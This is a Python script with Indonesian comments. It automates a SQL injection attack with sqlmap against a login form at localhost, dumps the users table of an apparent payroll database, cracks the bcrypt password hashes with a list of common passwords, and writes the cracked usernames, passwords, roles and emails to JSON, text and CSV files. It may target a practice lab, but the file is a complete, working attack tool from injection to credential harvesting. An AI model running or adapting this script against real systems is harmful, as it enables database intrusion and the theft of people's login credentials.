#!/usr/bin/env python3
"""
SQLMap Integration dengan Password Cracking
Otomatis dump users dan crack password bcrypt
"""

import subprocess
import json
import re
import hashlib
import bcrypt
import threading
import time
from concurrent.futures import ThreadPoolExecutor

class SQLMapPasswordCracker:
    def __init__(self):
        self.target_url = "http://localhost/public/login.php"
        self.post_data = "username=admin&password=test"
        self.parameter = "username"
        self.database = "bullscorp_payroll"
        self.table = "users"
        
        # Common passwords untuk brute force
        self.common_passwords = [
            "admin", "admin123", "admin5231", "password", "123456", "password123",
            "hr", "hr123", "hr2145", "halahgampang", "backdoor123", "test", "test123",
            "user", "user123", "employee", "bullscorp", "payroll", "login",
            "qwerty", "abc123", "admin2023", "admin2024", "admin2025"
        ]
        
        self.cracked_passwords = {}
        
    def run_sqlmap_dump(self):
        """Jalankan SQLMap untuk dump users table"""
        print("🚀 Menjalankan SQLMap untuk dump tabel users...")
        
        cmd = [
            "sqlmap",
            "-u", self.target_url,
            "--data", self.post_data,
            "-p", self.parameter,
            "-D", self.database,
            "-T", self.table,
            "-C", "id,username,password,email,role",
            "--dump",
            "--batch",
            "--output-dir", "./sqlmap_output"
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            print("✅ SQLMap selesai!")
            return self.parse_sqlmap_output()
        except subprocess.TimeoutExpired:
            print("⏰ SQLMap timeout, mencoba parsing output yang ada...")
            return self.parse_sqlmap_output()
        except Exception as e:
            print(f"❌ Error menjalankan SQLMap: {e}")
            return []
    
    def parse_sqlmap_output(self):
        """Parse output SQLMap untuk mendapatkan data users"""
        users = []
        
        # Coba baca dari file CSV yang dihasilkan SQLMap
        import os
        import glob
        
        csv_files = glob.glob("./sqlmap_output/**/users.csv", recursive=True)
        
        if csv_files:
            import csv
            with open(csv_files[0], 'r', encoding='utf-8') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    users.append({
                        'id': row.get('id', ''),
                        'username': row.get('username', ''),
                        'password': row.get('password', ''),
                        'email': row.get('email', ''),
                        'role': row.get('role', '')
                    })
        
        print(f"📊 Berhasil parse {len(users)} users dari SQLMap output")
        return users
    
    def crack_bcrypt_password(self, username, hash_password):
        """Crack single bcrypt password"""
        if not hash_password or not hash_password.startswith('$2'):
            return None
            
        print(f"🔓 Mencoba crack password untuk {username}...")
        
        for password in self.common_passwords:
            try:
                if bcrypt.checkpw(password.encode('utf-8'), hash_password.encode('utf-8')):
                    print(f"✅ CRACKED! {username} : {password}")
                    return password
            except Exception as e:
                continue
                
        print(f"❌ Gagal crack password untuk {username}")
        return None
    
    def crack_all_passwords(self, users):
        """Crack semua password dengan threading"""
        print(f"\n🔐 Memulai password cracking untuk {len(users)} users...")
        
        with ThreadPoolExecutor(max_workers=4) as executor:
            futures = []
            
            for user in users:
                if user['password']:
                    future = executor.submit(
                        self.crack_bcrypt_password, 
                        user['username'], 
                        user['password']
                    )
                    futures.append((user['username'], future))
            
            # Collect results
            for username, future in futures:
                try:
                    cracked_password = future.result(timeout=30)
                    if cracked_password:
                        self.cracked_passwords[username] = cracked_password
                except Exception as e:
                    print(f"❌ Error cracking {username}: {e}")
    
    def generate_report(self, users):
        """Generate laporan lengkap"""
        print("\n" + "="*80)
        print("📋 LAPORAN LENGKAP SQLMAP + PASSWORD CRACKING")
        print("="*80)
        
        print(f"\n📊 STATISTIK:")
        print(f"   Total Users: {len(users)}")
        print(f"   Passwords Cracked: {len(self.cracked_passwords)}")
        print(f"   Success Rate: {len(self.cracked_passwords)/len(users)*100:.1f}%")
        
        print(f"\n🔓 CRACKED CREDENTIALS:")
        print("-" * 60)
        for username, password in self.cracked_passwords.items():
            user_data = next((u for u in users if u['username'] == username), {})
            role = user_data.get('role', 'unknown')
            email = user_data.get('email', 'unknown')
            print(f"   {username:30} : {password:15} [{role}] ({email})")
        
        print(f"\n🔒 UNCRACKED USERS:")
        print("-" * 60)
        uncracked = [u for u in users if u['username'] not in self.cracked_passwords and u['password']]
        for user in uncracked[:10]:  # Show first 10
            print(f"   {user['username']:30} : {user['password'][:50]}...")
        
        if len(uncracked) > 10:
            print(f"   ... dan {len(uncracked)-10} users lainnya")
        
        print(f"\n💾 EXPORT RESULTS:")
        self.export_results(users)
    
    def export_results(self, users):
        """Export hasil ke berbagai format"""
        
        # 1. Export ke JSON
        export_data = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_users': len(users),
            'cracked_count': len(self.cracked_passwords),
            'users': []
        }
        
        for user in users:
            user_export = user.copy()
            user_export['cracked_password'] = self.cracked_passwords.get(user['username'], None)
            user_export['is_cracked'] = user['username'] in self.cracked_passwords
            export_data['users'].append(user_export)
        
        with open('sqlmap_cracked_results.json', 'w', encoding='utf-8') as f:
            json.dump(export_data, f, indent=2, ensure_ascii=False)
        print("   ✅ JSON: sqlmap_cracked_results.json")
        
        # 2. Export ke TXT (credentials only)
        with open('cracked_credentials.txt', 'w', encoding='utf-8') as f:
            f.write("CRACKED CREDENTIALS FROM SQLMAP\n")
            f.write("="*50 + "\n\n")
            for username, password in self.cracked_passwords.items():
                user_data = next((u for u in users if u['username'] == username), {})
                f.write(f"{username}:{password} [{user_data.get('role', 'unknown')}]\n")
        print("   ✅ TXT: cracked_credentials.txt")
        
        # 3. Export ke CSV
        import csv
        with open('all_users_with_cracks.csv', 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['ID', 'Username', 'Email', 'Role', 'Password_Hash', 'Cracked_Password', 'Is_Cracked'])
            
            for user in users:
                writer.writerow([
                    user.get('id', ''),
                    user.get('username', ''),
                    user.get('email', ''),
                    user.get('role', ''),
                    user.get('password', ''),
                    self.cracked_passwords.get(user['username'], ''),
                    'YES' if user['username'] in self.cracked_passwords else 'NO'
                ])
        print("   ✅ CSV: all_users_with_cracks.csv")
    
    def run(self):
        """Main function"""
        print("🎯 SQLMap + Password Cracking Tool")
        print("=" * 50)
        
        # Step 1: Run SQLMap
        users = self.run_sqlmap_dump()
        
        if not users:
            print("❌ Tidak ada data users yang berhasil di-dump!")
            return
        
        # Step 2: Crack passwords
        self.crack_all_passwords(users)
        
        # Step 3: Generate report
        self.generate_report(users)
        
        print(f"\n🎉 SELESAI! Check file output untuk hasil lengkap.")

if __name__ == "__main__":
    cracker = SQLMapPasswordCracker()
    cracker.run()